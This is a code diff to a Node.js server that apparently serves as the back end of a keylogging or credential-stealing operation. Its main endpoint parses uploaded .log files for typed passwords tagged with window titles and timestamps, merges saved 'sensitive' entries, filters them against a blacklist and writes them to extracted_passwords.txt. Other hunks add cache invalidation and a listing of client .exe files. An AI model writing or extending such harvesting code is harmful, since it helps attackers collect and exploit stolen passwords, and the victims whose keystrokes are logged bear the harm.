+                rawPassword: rawMatch ? rawMatch[1].trim() : '',
+                window: winMatch ? winMatch[1].trim() : '未知窗口'
+            });
+        }
+    }
+    return passwords;
+}
 
 app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
-    const allFiles = await alistClient.listFiles(alistClient.basePath);
-    const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
-    
-    if (logFiles.length === 0) return res.json({ success: true, count: 0 });
-
-    const currentFileStates = new Map();
-    for (const file of logFiles) {
-        const mtime = file.uploadTime ? new Date(file.uploadTime).getTime() : Date.now();
-        currentFileStates.set(file.filename, { mtime });
-    }
-
-    let needFullReextraction = false;
-    if (extractionCache.fileMTimes.size !== currentFileStates.size) {
-        needFullReextraction = true;
-    } else {
-        for (const [filename, state] of currentFileStates.entries()) {
-            const cached = extractionCache.fileMTimes.get(filename);
-            if (!cached || cached !== state.mtime) {
-                needFullReextraction = true;
-                break;
+    try {
+        let allFiles = [];
+        // 获取日志文件列表
+        for (let attempt = 0; attempt < 3; attempt++) {
+            try {
+                allFiles = await alistClient.listFiles(alistClient.basePath, true);
+                if (allFiles.length > 0) break;
+            } catch (error) {
+                if (attempt < 2) {
+                    const delayMs = 1000 * (attempt + 1);
+                    logger.warn(`获取文件列表失败 (${attempt + 1}/3)，${delayMs}ms 后重试:`, { error: error.message });
+                    await new Promise(resolve => setTimeout(resolve, delayMs));
+                } else {
+                    logger.error(`获取文件列表失败，已达最大重试次数:`, { error: error.message });
+                    throw error;
+                }
             }
         }
-    }
-
-    if (!needFullReextraction && extractionCache.passwords.length > 0) {
-        logger.info('缓存完全有效，直接返回密码提取结果');
-        return res.json({ success: true, count: extractionCache.passwords.length });
-    }
-
-    const filesToProcess = [];
-    const changedFileNames = new Set();
-    for (const file of logFiles) {
-        const mtime = currentFileStates.get(file.filename).mtime;
-        const cachedMtime = extractionCache.fileMTimes.get(file.filename);
-        if (!cachedMtime || cachedMtime !== mtime) {
-            filesToProcess.push(file);
-            changedFileNames.add(file.filename);
+        
+        const logFiles = allFiles.filter(file => file.filename.endsWith('.log'));
+        
+        // ===== 即使没有日志文件，也要处理维护文件，不能直接返回 =====
+        const currentFileStates = new Map();
+        for (const file of logFiles) {
+            const mtime = file.uploadTime ? new Date(file.uploadTime).getTime() : Date.now();
+            currentFileStates.set(file.filename, { mtime });
         }
-    }
 
-    logger.info(`密码提取：共 ${logFiles.length} 个日志文件，其中 ${filesToProcess.length} 个需要处理`);
+        let needFullReextraction = false;
+        if (extractionCache.fileMTimes.size !== currentFileStates.size) {
+            needFullReextraction = true;
+        } else {
+            for (const [filename, state] of currentFileStates.entries()) {
+                const cached = extractionCache.fileMTimes.get(filename);
+                if (!cached || cached !== state.mtime) {
+                    needFullReextraction = true;
+                    break;
+                }
+            }
+        }
 
-    // 加载黑名单缓存
-    await loadBlacklistCache();
+        if (!needFullReextraction && extractionCache.passwords.length === 0 && currentFileStates.size > 0) {
+            needFullReextraction = true;
+            logger.debug('提取缓存为空，强制重新处理所有日志文件');
+        }
 
-    const extractLimit = pLimit(CONFIG.extractConcurrency);
-    const extractTasks = filesToProcess.map(file => extractLimit(async () => {
-        try {
-            const content = await alistClient.readFile(`${alistClient.basePath}/${file.filename}`);
-            return extractPasswordsFromLog(content, file.filename);
-        } catch (error) {
-            logger.warn(`读取日志文件失败: ${file.filename}`, { error: error.message });
+        // 检查敏感保存文件是否更新，若更新则强制重新提取
+        if (!needFullReextraction) {
+            try {
+                const stats = await fs.promises.stat(CONFIG.sensitiveLogSavePath);
+                if (stats.mtimeMs > extractionCache.lastExtractTime) {
+                    needFullReextraction = true;
+                    logger.debug('敏感保存文件已更新，强制重新提取');
+                }
+            } catch (e) {
+                // 文件不存在则忽略
+            }
+        }
+
+        if (!needFullReextraction && extractionCache.passwords.length > 0) {
+            logger.debug('缓存完全有效，直接返回密码提取结果');
+            const passwordsWithIndex = extractionCache.passwords.map((item, index) => ({
+                ...item,
+                index: index + 1
+            }));
+            return res.json({
+                success: true,
+                count: extractionCache.passwords.length,
+                passwords: passwordsWithIndex
+            });
+        }
+
+        // 加载黑名单缓存
+        await loadBlacklistCache();
+
+        // 处理日志文件（如果有的话）
+        const filesToProcess = [];
+        const changedFileNames = new Set();
+        for (const file of logFiles) {
+            const mtime = currentFileStates.get(file.filename).mtime;
+            const cachedMtime = extractionCache.fileMTimes.get(file.filename);
+            if (!cachedMtime || cachedMtime !== mtime || extractionCache.passwords.length === 0) {
+                filesToProcess.push(file);
+                changedFileNames.add(file.filename);
+            }
+        }
+
+        logger.info(`密码提取：共 ${logFiles.length} 个日志文件，其中 ${filesToProcess.length} 个需要处理`);
+
+        const extractLimit = pLimit(CONFIG.extractConcurrency);
+        const extractTasks = filesToProcess.map(file => extractLimit(async () => {
+            let lastError = null;
+            for (let attempt = 0; attempt < 3; attempt++) {
+                try {
+                    const content = await alistClient.readFile(`${alistClient.basePath}/${file.filename}`);
+                    return extractPasswordsFromLog(content, file.filename);
+                } catch (error) {
+                    lastError = error;
+                    if (attempt < 2) {
+                        const delayMs = 1000 * (attempt + 1);
+                        logger.warn(`读取日志文件失败 (${attempt + 1}/3): ${file.filename}，${delayMs}ms 后重试`);
+                        await new Promise(resolve => setTimeout(resolve, delayMs));
+                    } else {
+                        logger.warn(`读取日志文件失败，已达最大重试次数: ${file.filename}`, { error: error.message });
+                    }
+                }
+            }
             return [];
+        }));
+
+        const results = await Promise.allSettled(extractTasks);
+        const newPasswords = [];
+        results.forEach(result => {
+            if (result.status === 'fulfilled') newPasswords.push(...result.value);
+        });
+
+        const unchangedFileNames = new Set(
+            logFiles.filter(f => !changedFileNames.has(f.filename)).map(f => f.filename)
+        );
+        const cachedPasswordsFromUnchangedFiles = extractionCache.passwords.filter(item =>
+            unchangedFileNames.has(item.file)
+        );
+
+        let allPasswords = [...cachedPasswordsFromUnchangedFiles, ...newPasswords];
+
+        // 合并日志维护时保存的密码（即使没有日志文件，这一步也执行）
+        let extraPasswords = [];
+        try {
+            if (fs.existsSync(CONFIG.sensitiveLogSavePath)) {
+                const saveContent = await fs.promises.readFile(
+                    CONFIG.sensitiveLogSavePath,
+                    'utf8'
+                );
+                extraPasswords = parseSensitiveSaves(saveContent);
+                logger.debug(`从敏感保存文件中解析到 ${extraPasswords.length} 条密码`);
+            }
+        } catch (e) {
+            logger.warn('读取敏感保存文件失败，已跳过', { error: e.message });
         }
-    }));
+        allPasswords = [...allPasswords, ...extraPasswords];
+        logger.info(`[DEBUG] saves 解析结果: ${JSON.stringify(extraPasswords)}`);
 
-    const results = await Promise.allSettled(extractTasks);
-    const newPasswords = [];
-    results.forEach(result => {
-        if (result.status === 'fulfilled') newPasswords.push(...result.value);
-    });
+        // 黑名单过滤
+        const filteredPasswords = allPasswords.filter(item => !isPasswordBlacklisted(item.password));
 
-    const unchangedFileNames = new Set(
-        logFiles.filter(f => !changedFileNames.has(f.filename)).map(f => f.filename)
-    );
-    const cachedPasswordsFromUnchangedFiles = extractionCache.passwords.filter(item =>
-        unchangedFileNames.has(item.file)
-    );
-
-    let allPasswords = [...cachedPasswordsFromUnchangedFiles, ...newPasswords];
-    const filteredPasswords = allPasswords.filter(item => {
-        return !isPasswordBlacklisted(item.password);
-    });
-
-    const uniquePasswords = [];
-    const seenSet = new Set();
-    for (const item of filteredPasswords) {
-        const key = `${item.file}|${item.password}`;
-        if (!seenSet.has(key)) {
-            seenSet.add(key);
-            uniquePasswords.push(item);
+        // 去重
+        let uniquePasswords = [];
+        const seenSet = new Set();
+        for (const item of filteredPasswords) {
+            const key = `${item.file}|${item.password}`;
+            if (!seenSet.has(key)) {
+                seenSet.add(key);
+                uniquePasswords.push(item);
+            }
         }
+        uniquePasswords.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));
+        uniquePasswords = uniquePasswords.filter(item => item.password && item.password.trim() !== '');
+
+        // 保存提取结果文件
+        const resultFilename = 'extracted_passwords.txt';
+        const resultContent = uniquePasswords.map((item, index) => {
+            return `${index + 1}. 来自: ${item.file}\n` +
+                `窗口: ${item.window || '未知'}\n` +
+                `时间: ${item.timestamp}\n` +
+                `内容: ${item.password}\n` +
+                `原始数据: ${item.rawPassword}\n`;
+        }).join('\n\n');
+
+        const logsDir = path.join(__dirname, 'logs');
+        if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
+        await fs.promises.writeFile(path.join(logsDir, resultFilename), resultContent);
+        logger.info(`成功保存提取结果到: ${resultFilename}, 密码数量: ${uniquePasswords.length}`);
+
+        // 更新缓存
+        extractionCache.lastExtractTime = Date.now();
+        extractionCache.passwords = uniquePasswords;
+        extractionCache.fileMTimes.clear();
+        for (const [filename, state] of currentFileStates.entries()) {
+            extractionCache.fileMTimes.set(filename, state.mtime);
+        }
+
+        const passwordsWithIndex = uniquePasswords.map((item, index) => ({
+            ...item,
+            index: index + 1
+        }));
+
+        res.json({ success: true, count: uniquePasswords.length, passwords: passwordsWithIndex });
+    } catch (error) {
+        logger.error('提取密码失败', { error: error.message, stack: error.stack });
+        res.status(500).json({ success: false, error: '提取密码失败: ' + error.message });
     }
-    uniquePasswords.sort((a, b) => (b.timestamp || '').localeCompare(a.timestamp || ''));
-
-    const resultFilename = 'extracted_passwords.txt';
-    const resultContent = uniquePasswords.map((item, index) => {
-        return `${index + 1}. 来自: ${item.file}\n` +
-               `窗口: ${item.window || '未知'}\n` +
-               `时间: ${item.timestamp}\n` +
-               `内容: ${item.password}\n` +
-               `原始数据: ${item.rawPassword}\n`;
-    }).join('\n');
-
-    const logsDir = path.join(__dirname, 'logs');
-    if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
-    await fs.promises.writeFile(path.join(logsDir, resultFilename), resultContent);
-    logger.info(`成功保存提取结果到: ${resultFilename}, 密码数量: ${uniquePasswords.length}`);
-
-    extractionCache.lastExtractTime = Date.now();
-    extractionCache.passwords = uniquePasswords;
-    extractionCache.fileMTimes.clear();
-    for (const [filename, state] of currentFileStates.entries()) {
-        extractionCache.fileMTimes.set(filename, state.mtime);
-    }
-
-    res.json({ success: true, count: uniquePasswords.length });
 }));
+
+async function clearExtractedPasswordFile() {
+    const filePath = path.join(__dirname, 'logs', 'extracted_passwords.txt');
+    try {
+        await fs.promises.unlink(filePath);
+        logger.debug('已删除旧的提取密码文件');
+    } catch (e) {
+        if (e.code !== 'ENOENT') {
+            logger.warn('删除提取密码文件失败', { error: e.message });
+        }
+    }
+}
 
 app.post('/api/blacklist/test', asyncHandler(async (req, res) => {
     const { password } = req.body;
@@ -2000,8 +3099,29 @@ app.post('/api/blacklist', asyncHandler(async (req, res) => {
     );
     // 更新缓存
     blacklistCache.set(passwordHash, normalizedPassword);
+    await clearExtractedPasswordFile();  
     logger.debug('添加黑名单: ' + normalizedPassword);
+    // 使密码提取缓存失效
+    extractionCache.fileMTimes.clear();
+    extractionCache.lastExtractTime = 0;
+    logger.debug('黑名单已更新，密码提取缓存已清除');   
+    // 清空密码列表
+    extractionCache.passwords = [];
     res.json({ success: true });
+}));
+
+app.post('/api/maintenance/clean-expired-logs', asyncHandler(async (req, res) => {
+    logger.info('收到手动清理过期日志请求', { user: req.user });
+    auditLogger.info('用户请求清理过期日志', { user: req.user, action: 'clean_expired_logs' });
+
+    try {
+        const result = await cleanExpiredLogs();
+        resetExtractionCache();
+        res.json({ success: true, message: '过期日志清理完成', data: result });
+    } catch (error) {
+        logger.error('手动清理过期日志失败', { error: error.message });
+        res.status(500).json({ success: false, error: error.message });
+    }
 }));
 
 app.get('/api/blacklist', asyncHandler(async (req, res) => {
@@ -2022,152 +3142,41 @@ app.get('/api/blacklist', asyncHandler(async (req, res) => {
 
 // ========== 版本管理 API ==========
 
-// 获取所有可用版本
-app.get('/api/versions', asyncHandler(async (req, res) => {
-    const rows = await executeWithRetry(
-        'SELECT id, version, download_url, is_active, force_update, created_at, updated_at FROM client_versions ORDER BY version DESC'
-    );
-    res.json({ success: true, versions: rows });
+// 获取 Alist 配置
+app.get('/api/config', asyncHandler(async (req, res) => {
+    res.json({
+        success: true,
+        config: {
+            alistUrl: CONFIG.alist.url,
+            alistBasePath: CONFIG.alist.basePath
+        }
+    });
 }));
 
-// 添加新版本
-app.post('/api/versions', asyncHandler(async (req, res) => {
-    const { version, download_url, is_active, force_update } = req.body;
-    
-    if (!version || !download_url) {
-        return res.status(400).json({ error: '版本号和下载链接不能为空' });
-    }
-    
-    // 验证版本号格式 (这里采用三段式: x.y.z)
-    if (!/^\d+\.\d+\.\d+$/.test(version)) {
-        return res.status(400).json({ error: '版本号格式错误，应为 X.Y.Z 格式' });
-    }
-    
-    // 验证URL格式
+// 获取 Alist 文件列表
+app.get('/api/alist/files', asyncHandler(async (req, res) => {
+    const path = req.query.path || CONFIG.alist.versionPath;
     try {
-        new URL(download_url);
-    } catch (e) {
-        return res.status(400).json({ error: '下载链接格式错误，请输入有效的URL' });
-    }
-    
-    const connection = await pool.getConnection();
-    try {
-        await connection.beginTransaction();
-        
-        // 检查版本是否已存在
-        const [existing] = await connection.execute(
-            'SELECT id FROM client_versions WHERE version = ?',
-            [version]
-        );
-        if (existing.length > 0) {
-            await connection.rollback();
-            return res.status(400).json({ error: '版本已存在，请勿重复添加' });
-        }
-        
-        // 如果设置为激活状态，先取消其他版本的激活状态
-        if (is_active) {
-            await connection.execute('UPDATE client_versions SET is_active = FALSE WHERE is_active = TRUE');
-        }
-        
-        const [result] = await connection.execute(
-            'INSERT INTO client_versions (version, download_url, is_active, force_update) VALUES (?, ?, ?, ?)',
-            [version, download_url, is_active || false, force_update || false]
-        );
-        
-        await connection.commit();
-        
-        logger.info(`添加新版本: ${version}`, { user: req.user || 'unknown' });
-        res.json({ success: true, message: '版本添加成功', id: result.insertId });
+        const files = await alistClient.listFiles(path);
+        // 只过滤 .exe 文件
+        const exeFiles = files
+            .filter(f => f.filename && f.filename.toLowerCase().endsWith('.exe'))
+            .map(f => ({
+                name: f.filename,
+                size: f.size,
+                uploadTime: f.uploadTime
+            }));
+        res.json({
+            success: true,
+            files: exeFiles
+        });
     } catch (error) {
-        await connection.rollback();
-        logger.error('添加版本失败', { error: error.message });
-        throw error;
-    } finally {
-        connection.release();
+        logger.error('获取 Alist 文件列表失败', { error: error.message, path });
+        res.status(500).json({ success: false, error: '获取文件列表失败: ' + error.message });
     }
 }));
 
-// 更新版本设置
-app.put('/api/versions/:id', asyncHandler(async (req, res) => {
-    const { id } = req.params;
-    const { version, download_url, is_active, force_update } = req.body;
-    
-    if (!version || !download_url) {
-        return res.status(400).json({ error: '版本号和下载链接不能为空' });
-    }
-    
-    // 验证版本号格式（与添加保持一致的三段式）
-    if (!/^\d+\.\d+\.\d+$/.test(version)) {
-        return res.status(400).json({ error: '版本号格式错误，应为 X.Y.Z 格式' });
-    }
-    
-    // 验证 URL 格式
-    try {
-        new URL(download_url);
-    } catch (e) {
-        return res.status(400).json({ error: '下载链接格式错误' });
-    }
-    
-    const connection = await pool.getConnection();
-    try {
-        await connection.beginTransaction();
-        
-        // 检查版本是否存在
-        const [versionCheck] = await connection.execute(
-            'SELECT id FROM client_versions WHERE id = ?',
-            [id]
-        );
-        if (versionCheck.length === 0) {
-            await connection.rollback();
-            return res.status(404).json({ error: '版本不存在' });
-        }
-        
-        // 检查修改后的版本号是否与其他记录冲突
-        const [existing] = await connection.execute(
-            'SELECT id FROM client_versions WHERE version = ? AND id != ?',
-            [version, id]
-        );
-        if (existing.length > 0) {
-            await connection.rollback();
-            return res.status(400).json({ error: '版本已存在，请使用其他版本号' });
-        }
-        
-        // 如果设置为激活状态，先取消其他版本的激活
-        if (is_active) {
-            await connection.execute(
-                'UPDATE client_versions SET is_active = FALSE WHERE is_active = TRUE AND id != ?',
-                [id]
-            );
-        }
-        
-        // 更新版本记录
-        await connection.execute(
-            'UPDATE client_versions SET version = ?, download_url = ?, is_active = ?, force_update = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?',
-            [version, download_url, is_active || false, force_update || false, id]
-        );
-        
-        await connection.commit();
-        
-        logger.info(`更新版本: ${version}`, { user: req.user || 'unknown' });
-        res.json({ success: true, message: '版本更新成功' });
-    } catch (error) {
-        await connection.rollback();
-        logger.error('更新版本失败', { error: error.message });
-        throw error;
-    } finally {
-        connection.release();
-    }
-}));
 
-// 删除版本
-app.delete('/api/versions/:id', asyncHandler(async (req, res) => {
-    const { id } = req.params;
-    
-    await executeWithRetry('DELETE FROM client_versions WHERE id = ?', [id]);
-    
-    logger.info(`删除版本 ID: ${id}`, { user: req.user || 'unknown' });
-    res.json({ success: true, message: '版本删除成功' });
-}));
 
 app.delete('/api/blacklist/:id', asyncHandler(async (req, res) => {
     const id = Number(req.params.id);
@@ -2182,7 +3191,12 @@ app.delete('/api/blacklist/:id', asyncHandler(async (req, res) => {
     
     // 从缓存中移除
     blacklistCache.delete(rows[0].password_hash);
+    await clearExtractedPasswordFile(); 
     logger.debug(`删除黑名单: ${normalizePassword(rows[0].password)}`);
+    extractionCache.fileMTimes.clear();
+    extractionCache.lastExtractTime = 0;
+    extractionCache.passwords = [];
+    logger.debug('黑名单已删除，密码提取缓存已清除');
     res.json({ success: true });
 }));
 
